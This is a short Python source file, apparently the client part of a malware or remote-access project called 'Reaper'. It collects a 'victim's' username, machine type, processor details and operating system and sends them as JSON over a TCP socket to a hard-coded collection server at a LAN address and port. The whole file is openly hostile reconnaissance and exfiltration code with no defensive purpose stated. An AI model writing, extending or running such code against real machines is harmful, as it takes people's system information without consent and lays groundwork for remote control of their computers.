import socket
from Reaper import Reaper
from Victim import Victim
import json

SERVER_IP = "192.168.1.157"
SERVER_PORT = 4678



class Reaper_client(Reaper):

    def __init__(self):
        self.victim = Victim()


    def get_serialized_victim_details(self):
        # Serialize the list containing the victim's details
        # using json and send it

        data = [self.victim.username, self.victim.machine, self.victim.processor, 
                self.victim.processor_count, self.victim.system]

        return json.dumps(data)

    def connect(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((SERVER_IP, SERVER_PORT))
            # sock.send(self.victim.username.encode())
            # sock.send(self.victim.system.encode())
            # sock.send(self.victim.machine.encode())
            # sock.send(self.victim.processor.encode())
            # sock.send(self.victim.processor_count.encode())               
            sock.send(self.get_serialized_victim_details().encode())

        input("Press enter to exit...")



if __name__ == '__main__':
    client = Reaper_client()
    client.connect()
